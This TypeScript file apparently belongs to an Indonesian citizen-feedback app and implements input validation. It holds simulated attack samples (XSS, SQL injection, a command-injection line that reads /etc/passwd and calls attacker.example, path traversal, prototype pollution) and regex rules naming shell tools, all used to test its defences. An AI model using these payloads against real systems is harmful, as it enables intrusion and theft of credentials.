export type AttackCategory =
  | "xss"
  | "injection"
  | "command-injection"
  | "path-traversal"
  | "prototype-pollution"
  | "secret-exposure"
  | "abuse-rate-limit"
  | "privacy-leak";

export interface SecurityPayload {
  id: string;
  label: string;
  category: AttackCategory;
  severity: "low" | "medium" | "high" | "critical";
  sample: string;
  expectedDefense: string;
}

export interface DefenseFinding {
  category: AttackCategory | "validation";
  label: string;
  severity: "info" | "low" | "medium" | "high" | "critical";
  evidence: string;
  recommendation: string;
}

export interface DefenseReport {
  originalInput: string;
  normalizedInput: string;
  sanitizedOutput: string;
  findings: DefenseFinding[];
  isAllowed: boolean;
  riskScore: number;
  decision: "allow" | "sanitize" | "block" | "manual-review";
}

export interface RateLimitDecision {
  allowed: boolean;
  remainingAttempts: number;
  retryAfterSeconds: number;
}

const MAX_FEEDBACK_LENGTH = 1_500;
const INVISIBLE_CHARACTER_PATTERN = /[\u200B-\u200D\uFEFF]/g;

export const SECURITY_PAYLOADS: SecurityPayload[] = [
  {
    id: "xss-script-tag",
    label: "Simulasi XSS: script tag",
    category: "xss",
    severity: "high",
    sample: "<script>alert('PIL')</script> Drainase tersumbat di dekat sekolah.",
    expectedDefense: "HTML harus di-escape, bukan dirender sebagai markup aktif.",
  },
  {
    id: "xss-event-handler",
    label: "Simulasi XSS: event handler HTML",
    category: "xss",
    severity: "high",
    sample: "<img src=x onerror=alert('uji')> laporan sampah menumpuk.",
    expectedDefense: "Atribut event handler harus terdeteksi lalu output disanitasi.",
  },
  {
    id: "sql-injection-text",
    label: "Simulasi injection string",
    category: "injection",
    severity: "high",
    sample: "' OR '1'='1' -- cek semua laporan warga",
    expectedDefense: "Input mencurigakan harus ditandai untuk review, bukan digabung ke query mentah.",
  },
  {
    id: "command-injection-text",
    label: "Simulasi command injection string",
    category: "command-injection",
    severity: "critical",
    sample: "laporan banjir; cat /etc/passwd && curl attacker.example",
    expectedDefense: "Karakter chaining command harus memicu blokir/manual review.",
  },
  {
    id: "path-traversal-text",
    label: "Simulasi path traversal string",
    category: "path-traversal",
    severity: "high",
    sample: "../../../../etc/passwd tolong cek file peta wilayah",
    expectedDefense: "Path traversal harus ditolak untuk fitur upload/download/file access.",
  },
  {
    id: "prototype-pollution-json",
    label: "Simulasi prototype pollution JSON",
    category: "prototype-pollution",
    severity: "critical",
    sample: "{\"__proto__\":{\"isAdmin\":true},\"keluhan\":\"jalan rusak\"}",
    expectedDefense: "Key berbahaya seperti __proto__, constructor, dan prototype harus diblokir.",
  },
  {
    id: "privacy-leak-nik-email",
    label: "Simulasi kebocoran data pribadi",
    category: "privacy-leak",
    severity: "medium",
    sample: "Nama saya Budi, NIK 3302010101010001, email budi@example.com. Mohon cek drainase.",
    expectedDefense: "NIK dan email harus di-redact sebelum ditampilkan/disimpan.",
  },
  {
    id: "secret-exposure",
    label: "Simulasi secret/API key tertempel",
    category: "secret-exposure",
    severity: "critical",
    sample: "api_key = sk_test_1234567890abcdef password=rahasia123 laporan warga",
    expectedDefense: "Token, API key, dan password harus di-redact serta ditandai risiko tinggi.",
  },
];

const detectionRules: Array<{
  category: AttackCategory;
  label: string;
  severity: DefenseFinding["severity"];
  pattern: RegExp;
  recommendation: string;
}> = [
  {
    category: "xss",
    label: "Pola XSS terdeteksi",
    severity: "high",
    pattern: /<\s*script|on\w+\s*=|javascript\s*:/i,
    recommendation: "Escape output HTML, hindari dangerouslySetInnerHTML, dan gunakan allowlist jika menerima rich text.",
  },
  {
    category: "injection",
    label: "Pola injection terdeteksi",
    severity: "high",
    pattern: /(\bOR\b|\bAND\b)\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+|UNION\s+SELECT|DROP\s+TABLE|--/i,
    recommendation: "Gunakan parameterized query di backend dan jangan pernah menyusun query dari string input mentah.",
  },
  {
    category: "command-injection",
    label: "Pola command injection terdeteksi",
    severity: "critical",
    pattern: /(\|\||&&|;\s*(cat|curl|wget|rm|powershell|cmd)|`|\$\()/i,
    recommendation: "Jangan kirim input user ke shell. Gunakan API internal dengan allowlist argumen.",
  },
  {
    category: "path-traversal",
    label: "Pola path traversal terdeteksi",
    severity: "high",
    pattern: /(\.\.\/|\.\.\\|%2e%2e|\/etc\/passwd|windows\\win\.ini)/i,
    recommendation: "Normalisasi path di backend, gunakan allowlist direktori, dan tolak traversal sequence.",
  },
  {
    category: "prototype-pollution",
    label: "Key prototype pollution terdeteksi",
    severity: "critical",
    pattern: /(__proto__|constructor\s*:|prototype\s*:)/i,
    recommendation: "Tolak key __proto__, constructor, dan prototype saat parsing JSON atau merge object.",
  },
  {
    category: "secret-exposure",
    label: "Kemungkinan secret/API key terdeteksi",
    severity: "critical",
    pattern: /(api[_-]?key|secret|token|password)\s*[:=]/i,
    recommendation: "Hapus secret dari input/log, simpan credential hanya di environment variable atau secret manager.",
  },
];

const severityScore: Record<DefenseFinding["severity"], number> = {
  info: 0,
  low: 10,
  medium: 25,
  high: 35,
  critical: 50,
};

const escapeHtml = (value: string): string =>
  value
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");

export const redactSensitiveData = (value: string): string =>
  value
    .replace(/[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/gi, "[email-redacted]")
    .replace(/\b\d{16}\b/g, "[nik-redacted]")
    .replace(/\b(?:\+62|62|0)8\d{8,12}\b/g, "[phone-redacted]")
    .replace(/(api[_-]?key|secret|token|password)\s*[:=]\s*[^\s,;]+/gi, "$1=[secret-redacted]");

export const normalizeCitizenInput = (value: string): string =>
  value.replace(INVISIBLE_CHARACTER_PATTERN, "").trim().slice(0, MAX_FEEDBACK_LENGTH);

export const detectAttackIndicators = (value: string): DefenseFinding[] => {
  const findings = detectionRules
    .filter((rule) => rule.pattern.test(value))
    .map<DefenseFinding>((rule) => ({
      category: rule.category,
      label: rule.label,
      severity: rule.severity,
      evidence: rule.category,
      recommendation: rule.recommendation,
    }));

  if (value.length > MAX_FEEDBACK_LENGTH) {
    findings.push({
      category: "validation",
      label: "Input terlalu panjang",
      severity: "medium",
      evidence: `${value.length} karakter`,
      recommendation: `Batasi input maksimal ${MAX_FEEDBACK_LENGTH} karakter dan validasi ulang di backend.`,
    });
  }

  if (/\b\d{16}\b|[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/i.test(value)) {
    findings.push({
      category: "privacy-leak",
      label: "Data pribadi perlu disamarkan",
      severity: "medium",
      evidence: "NIK/email/nomor kontak",
      recommendation: "Redact data pribadi sebelum ditampilkan di UI, log, atau export kebijakan.",
    });
  }

  if (findings.length === 0) {
    findings.push({
      category: "validation",
      label: "Tidak ada pola berisiko tinggi",
      severity: "info",
      evidence: "basic-pattern-check",
      recommendation: "Tetap lakukan validasi ulang di backend sebelum menyimpan data produksi.",
    });
  }

  return findings;
};

const decideAction = (riskScore: number): DefenseReport["decision"] => {
  if (riskScore >= 80) return "block";
  if (riskScore >= 50) return "manual-review";
  if (riskScore >= 15) return "sanitize";
  return "allow";
};

export const validateCitizenFeedback = (input: string): DefenseReport => {
  const normalizedInput = normalizeCitizenInput(input);
  const findings = detectAttackIndicators(input);
  const riskScore = Math.min(
    100,
    findings.reduce((total, finding) => total + severityScore[finding.severity], 0),
  );
  const decision = decideAction(riskScore);
  const sanitizedOutput = escapeHtml(redactSensitiveData(normalizedInput));

  return {
    originalInput: input,
    normalizedInput,
    sanitizedOutput,
    findings,
    isAllowed: decision === "allow" || decision === "sanitize",
    riskScore,
    decision,
  };
};

const hasUnsafeJsonKey = (value: unknown): boolean => {
  if (Array.isArray(value)) {
    return value.some(hasUnsafeJsonKey);
  }

  if (value && typeof value === "object") {
    return Object.entries(value as Record<string, unknown>).some(
      ([key, nestedValue]) => ["__proto__", "constructor", "prototype"].includes(key) || hasUnsafeJsonKey(nestedValue),
    );
  }

  return false;
};

export const safeJsonParse = <T>(value: string): { ok: true; data: T } | { ok: false; error: string } => {
  try {
    const parsed = JSON.parse(value) as T;

    if (hasUnsafeJsonKey(parsed)) {
      return { ok: false, error: "JSON mengandung key prototype pollution yang diblokir." };
    }

    return { ok: true, data: parsed };
  } catch {
    return { ok: false, error: "Format JSON tidak valid." };
  }
};

const requestLog = new Map<string, number[]>();

export const checkClientRateLimit = (
  key: string,
  now = Date.now(),
  maxAttempts = 8,
  windowMs = 60_000,
): RateLimitDecision => {
  const recentAttempts = (requestLog.get(key) ?? []).filter((timestamp) => now - timestamp < windowMs);

  if (recentAttempts.length >= maxAttempts) {
    const oldestAttempt = recentAttempts[0] ?? now;
    return {
      allowed: false,
      remainingAttempts: 0,
      retryAfterSeconds: Math.ceil((windowMs - (now - oldestAttempt)) / 1_000),
    };
  }

  const updatedAttempts = [...recentAttempts, now];
  requestLog.set(key, updatedAttempts);

  return {
    allowed: true,
    remainingAttempts: Math.max(0, maxAttempts - updatedAttempts.length),
    retryAfterSeconds: 0,
  };
};

export const runSecuritySimulation = (): Array<{ payload: SecurityPayload; report: DefenseReport }> =>
  SECURITY_PAYLOADS.map((payload) => ({
    payload,
    report: validateCitizenFeedback(payload.sample),
  }));
